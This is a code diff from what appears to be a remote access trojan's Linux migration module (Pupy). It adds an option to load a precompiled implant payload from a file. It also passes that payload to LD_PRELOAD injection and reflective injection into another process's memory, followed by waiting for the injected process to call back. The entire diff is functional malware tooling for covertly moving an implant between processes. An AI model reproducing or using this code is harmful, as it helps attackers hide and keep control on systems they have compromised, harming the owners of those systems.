@@ -18,21 +18,28 @@ def has_proc_migrated(client, pid):
                 return c
     return None
 
-def get_payload(module, compressed=True, debug=False):
-    conf = module.client.get_conf()
-    dllbuf, _, _ = pupygen.generate_binary_from_template(
-        module.log,
-        conf, 'linux',
-        arch=module.client.arch, shared=True,
-        debug=debug or conf['debug']
-    )
+def get_payload(module, compressed=True, debug=False, from_payload=None):
+    dllbuff = None
+    if from_payload:
+        with open(from_payload, 'rb') as payload:
+            dllbuff = payload.read()
+
+        module.success('Precompiled payload: {}'.format(from_payload))
+    else:
+        conf = module.client.get_conf()
+        dllbuff, _, _ = pupygen.generate_binary_from_template(
+            module.log,
+            conf, 'linux',
+            arch=module.client.arch, shared=True,
+            debug=debug or conf['debug']
+        )
 
     if not compressed:
-        return dllbuf
+        return dllbuff
 
     dllgzbuf = cStringIO.StringIO()
     gzf = gzip.GzipFile('pupy.so', 'wb', 9, dllgzbuf)
-    gzf.write(dllbuf)
+    gzf.write(dllbuff)
     gzf.close()
 
     return dllgzbuf.getvalue()
@@ -56,8 +63,8 @@ def wait_connect(module, pid, timeout=10):
 
         time.sleep(1)
 
-def ld_preload(module, command, wait_thread=False, keep=False, debug=False):
-    payload = get_payload(module, debug)
+def ld_preload(module, command, wait_thread=False, keep=False, debug=False, from_payload=None):
+    payload = get_payload(module, debug, from_payload=from_payload)
 
     pid = module.client.conn.modules['pupy'].ld_preload_inject_dll(
         command, payload, wait_thread
@@ -74,8 +81,8 @@ def ld_preload(module, command, wait_thread=False, keep=False, debug=False):
 
     module.success("migration completed")
 
-def migrate(module, pid, keep=False, timeout=10, debug=False):
-    payload = get_payload(module, debug)
+def migrate(module, pid, keep=False, timeout=10, debug=False, from_payload=None):
+    payload = get_payload(module, debug, from_payload=from_payload)
 
     r = module.client.conn.modules['pupy'].reflective_inject_dll(
         pid, payload
